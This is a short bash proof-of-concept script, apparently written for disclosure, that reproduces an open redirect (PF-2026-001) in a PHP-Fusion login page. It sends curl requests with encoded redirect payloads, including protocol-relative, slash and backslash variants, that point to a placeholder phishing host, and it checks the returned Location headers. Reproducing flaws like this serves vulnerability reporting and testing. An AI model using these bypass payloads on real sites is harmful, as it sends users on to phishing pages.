#!/usr/bin/env bash
# PF-2026-001 Open Redirect - reproduction (does NOT follow the redirect; stays local)
set -u
BASE="${1:-http://localhost/php-fusion}"
echo "== PoC 1: %2F%2F protocol-relative =="
curl -s -o /dev/null -D - "$BASE/login.php?error=1&redirect=%2F%2Fattacker.example%2Fphish" | grep -Ei '^(HTTP|Location):'
echo; echo "== PoC 2: /%2F variant =="
curl -s -o /dev/null -D - "$BASE/login.php?error=1&redirect=/%2Fattacker.example" | grep -Ei '^(HTTP|Location):'
echo; echo "== PoC 3: /\\ backslash variant =="
curl -s -o /dev/null -D - "$BASE/login.php?error=1&redirect=/%5Cattacker.example" | grep -Ei '^(HTTP|Location):'
echo; echo "== CONTROL: absolute https is rejected =="
curl -s -o /dev/null -D - "$BASE/login.php?error=1&redirect=https://attacker.example" | grep -Ei '^(HTTP|Location):'
